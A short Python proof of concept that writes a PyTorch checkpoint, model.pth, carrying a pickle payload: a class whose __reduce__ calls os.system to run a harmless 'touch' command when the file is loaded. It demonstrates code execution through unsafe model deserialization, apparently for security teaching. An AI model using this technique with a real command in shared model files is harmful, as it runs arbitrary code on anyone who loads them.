import torch
import pickle
import io
import os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('touch evilfileCreatedForDemo',))

state_dict = {"run_command": RunCommand()}

with open('model.pth', 'wb') as f:
    torch.save(state_dict, f)

